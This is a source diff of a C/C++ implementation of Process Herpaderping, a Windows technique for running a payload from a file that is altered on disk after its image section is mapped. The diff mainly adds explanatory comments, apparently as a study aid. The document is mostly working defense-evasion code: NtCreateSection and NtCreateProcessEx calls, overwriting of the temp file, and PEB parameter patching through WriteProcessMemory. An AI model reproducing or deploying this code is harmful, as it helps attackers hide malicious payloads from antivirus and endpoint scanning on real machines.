@@ -22,7 +22,7 @@ BYTE* GetPayloadBuffer(OUT size_t& p_size) {
     }
     return bufferAddress;
 }
-
+// Getting entry point of the payload within the child process which was created from the image section.
 ULONG_PTR GetEntryPoint(HANDLE hProcess, BYTE* payloadBuffer, PROCESS_BASIC_INFORMATION pbi) {
     // resolving requisite apis
     _RtlImageNtHeader pRtlImageNtHeader = (_RtlImageNtHeader)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlImageNtHeader");
@@ -46,11 +46,11 @@ ULONG_PTR GetEntryPoint(HANDLE hProcess, BYTE* payloadBuffer, PROCESS_BASIC_INFO
         perror("[-] Failed to read the PEB base address\n");
         exit(-1);
     }
-    printf("[+] PEB base address : %p\n", (ULONG_PTR)((PPEB)image)->ImageBaseAddress);
+    printf("[+] PEB image base address : %p\n", (ULONG_PTR)((PPEB)image)->ImageBaseAddress);
     entryPoint = (pRtlImageNtHeader(payloadBuffer))->OptionalHeader.AddressOfEntryPoint;
     printf("[+] Address of the entry point: %p\n", entryPoint);
     entryPoint += (ULONG_PTR)((PPEB)image)->ImageBaseAddress;
-    printf("[+] Entry point address adjusted with the base address of image: %p\n", entryPoint);
+    printf("[+] Entry point address adjusted with the image base address: %p\n", entryPoint);
 
     return entryPoint;
 }
@@ -132,7 +132,7 @@ BOOL Herpaderping(BYTE* payloadBuffer, size_t payloadSize) {
         perror("[-] Unable to write payload to the temporary file...\n");
         exit(-1);
     }
-    printf("[+] Wrote payload to the temporary file\n");
+    printf("[+] Wrote payload to the temporary file\n"); // in HxD, view or reload the file and we can see our malicious payload.
 
     // create section with the temporary file; SEC_IMAGE flag for PE vlidation
     status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, 0 , PAGE_READONLY, SEC_IMAGE, hTemp);
@@ -140,7 +140,7 @@ BOOL Herpaderping(BYTE* payloadBuffer, size_t payloadSize) {
         perror("[-] Failed to create a section with the temporary file\n");
         exit(-1);
     }
-    printf("[+] Created a section with the temporary file\n");
+    printf("[+] Created a section with the temporary file\n"); // for herp.exe in system informer, click 'handles' and you can see section pointing to the path of the temp file created above.
 
     // create process with the section
     status = pNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), PS_INHERIT_HANDLES, hSection, NULL, NULL, FALSE);
@@ -148,9 +148,9 @@ BOOL Herpaderping(BYTE* payloadBuffer, size_t payloadSize) {
         perror("[-] Failed to create a process with the section\n");
         exit(-1);
     }
-    printf("[+] Created a process with the section\n");
+    printf("[+] Created a process with the section\n"); // in systen informer, you can see now herp.exe has a child process with the name of the temp file. Right click for properties.
 
-    // Get process information
+    // Get process information of the process created above.
     status = pNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), 0);
     if (!NT_SUCCESS(status)){
         perror("[-] Failed to query the process information\n");
@@ -169,18 +169,18 @@ BOOL Herpaderping(BYTE* payloadBuffer, size_t payloadSize) {
         WriteFile(hTemp, bytesToWrite, sizeof(bytesToWrite), &bytesWritten, NULL);
         bufferSize -= bytesWritten;
     }
-    printf("[+] Modified file on the disk\n");
+    printf("[+] Modified file on the disk\n"); // reloading the tmp file on the disk in HxD can vaidate this.
 
-    // Set process parameters. We need to set process parameters because we cannot create a thread within a process which has no parameters set.
+    // Set process parameters of the child process. We need to set process parameters because we cannot create a thread within a process which has no parameters set.
     printf("[+] Setting process parameters\n");
     wchar_t targetFilePath[MAX_PATH] = { 0 };
-    lstrcpy(targetFilePath, L"C:\\Windows\\System32\\calc.exe"); // these values are fake, we can set these to any thing...
+    lstrcpyW(targetFilePath, L"C:\\Windows\\System32\\calc.exe"); // these values are fake, we can set these to any thing...
     pRtlInitUnicodeString(&uTargetFilePath, targetFilePath);
     wchar_t dllDir[] = L"C:\\Windows\\System32";
     UNICODE_STRING uDllDir = { 0 };
     pRtlInitUnicodeString(&uDllPath, dllDir);
     status = pRtlCreateProcessParametersEx(&processParameters, &uTargetFilePath, &uDllPath, NULL, &uTargetFilePath, 
-        NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED);
+        NULL, NULL, NULL, NULL, NULL, RTL_USER_PROC_PARAMS_NORMALIZED); // the processParameters can be validated by adding the var 'processParameters' to debug watch.
     if (!NT_SUCCESS(status)){
         perror("[-] Failed to set process parameters\n");
         exit(-1);
@@ -202,8 +202,8 @@ BOOL Herpaderping(BYTE* payloadBuffer, size_t payloadSize) {
     }
 
     // Getting the remote/target PEB address
-    remotePEB = (PEB*)pbi.PebBaseAddress;
-    if(!WriteProcessMemory(hProcess, &remotePEB->ProcessParameters, &processParameters, sizeof(PVOID), NULL)) {
+    remotePEB = (PEB*)pbi.PebBaseAddress; // this address can be found in the 'memory' section of the 'system informer' of the child / spawned process.
+    if(!WriteProcessMemory(hProcess, &remotePEB->ProcessParameters, &processParameters, sizeof(PVOID), NULL)) { // the remotePEB->ProcessParameters are at 0x20 offset of the PEB based address. Can be verified in system informer.
         perror("[-] Failed to update the process parameters address\n");
         exit(-1);
     }
